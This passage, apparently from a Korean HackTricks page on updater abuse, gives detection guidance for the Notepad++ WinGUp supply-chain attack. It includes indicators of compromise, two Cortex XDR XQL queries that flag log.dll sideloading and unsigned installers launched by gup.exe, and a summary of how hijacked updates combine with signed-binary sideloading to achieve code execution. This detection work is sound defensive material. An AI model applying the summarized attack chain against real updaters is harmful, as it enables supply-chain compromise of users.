- **BYO signed binary sideloading**을 다운로드 이후 탐지의 전환점으로 활용하세요. 서명된 공급업체 EXE가 표준 설치 경로 외부의 DLL 이름을 로드하는 경우(예: Bitdefender가 Temp/Downloads에서 `log.dll`을 로드)와 업데이터가 Temp에서 공급업체 서명이 없는 설치 프로그램을 배치/실행하는 경우 경고를 발생시키세요.
- 이 공격 체인에서 관찰된 **악성코드별 아티팩트**를 모니터링하세요(일반적인 탐지 단서로 유용): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` 쓰기, Lua 기반 shellcode injection 단계.
- Notepad++는 v8.8.9 이후 WinGUp을 강화했습니다. 반환된 XML에 이제 서명(XMLDSig)을 적용하며, 최신 빌드는 전송 계층만 신뢰하는 대신 다운로드한 설치 프로그램의 인증서와 서명을 모두 검증합니다.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 서명 EXE의 <code>log.dll</code> sideloading (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

이러한 패턴은 서명되지 않은 manifest를 허용하거나 installer 서명자를 고정하지 않는 모든 updater에 적용됩니다. 네트워크 하이재킹 + 악성 installer + BYO-signed sideloading을 조합하면 “신뢰할 수 있는” 업데이트를 가장해 원격 코드 실행이 가능합니다.

---
## References
- [1] [자문 – Windows용 Netskope Client – Rogue Server를 통한 로컬 권한 상승 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 보안 자문 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre 및 Razer Synapse 4 pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent의 쓰기 가능한 파일을 통한 로컬 권한 상승](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent의 권한 상승](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 국가 지원 공격자들이 Notepad++ 공급망을 악용](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 하이재킹된 인프라 사고 업데이트](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows용 Netskope Client의 CVE-2025-0309 수정 우회](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage의 권한 상승 버그 발견](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
